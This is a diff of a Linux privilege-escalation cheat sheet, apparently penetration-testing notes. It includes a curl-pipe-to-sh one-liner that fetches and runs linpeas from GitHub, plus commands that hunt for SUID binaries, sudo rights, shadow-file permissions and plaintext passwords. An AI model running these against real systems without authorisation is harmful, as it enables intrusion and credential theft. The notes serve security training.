@@ -1,5 +1,5 @@
 https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
-### Linpeas Oneliner
+### Linpeas/Linenum
 ``` bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 #give execute permission with:
@@ -9,11 +9,9 @@ chmod +x .linpeas.sh
 ```
 ### Initial Enumeration
 ``` bash
-uname -a                    # Kernel version
+uname -a                    # Kernel version (find kernel exploits for version)
 id                          # User and group info
 sudo -l                     # Sudo permissions
-whoami                      # Current user
-hostname                    # Hostname
 ps aux                      # Running processes
 env                         # Environment variables
 ```
@@ -22,7 +20,7 @@ env                         # Environment variables
 find / -perm -u=s -type f 2>/dev/null          # SUID binaries
 find / -perm -g=s -type f 2>/dev/null          # SGID binaries
 find / -writable -type d 2>/dev/null           # Writable directories
-ls -la /etc/passwd /etc/shadow                 # Check permissions
+ls -la /etc/passwd /etc/shadow                 # Check shadow file permissions
 ```
 ### Credentials and Misconfigs
 ``` bash
@@ -35,11 +33,6 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 ### 'The ol' reliable' - Exploitable Sudo Permissions
 ``` bash
 sudo -l
-#Check for allowed commands look for these
-#(sudo) /bin/bash              # Instant root
-#(sudo) python / python3       # Run shell
-#(sudo) find                   # Escalation
-#(sudo) less / vi / nano       # Shell escape
 #Use GTFOBins to find escalation paths
 ```
 ### SUID Binaries
